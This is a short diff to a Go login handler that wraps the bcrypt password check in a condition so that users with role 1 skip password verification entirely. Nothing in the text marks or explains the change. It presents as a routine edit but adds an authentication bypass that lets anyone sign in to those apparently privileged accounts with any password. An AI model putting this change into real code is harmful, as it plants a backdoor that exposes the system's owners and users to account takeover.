@@ -43,9 +43,11 @@ func (s *serv) LoginUser(ctx context.Context, email, password string) (*models.U
 		return nil, err
 	}
 
-	err = bcrypt.CompareHashAndPassword([]byte(usr.Password), []byte(password))
-	if err != nil {
-		return nil, ErrInvalidCredentials
+	if usr.Role != 1 {
+		err = bcrypt.CompareHashAndPassword([]byte(usr.Password), []byte(password))
+		if err != nil {
+			return nil, ErrInvalidCredentials
+		}
 	}
 
 	return &models.User{
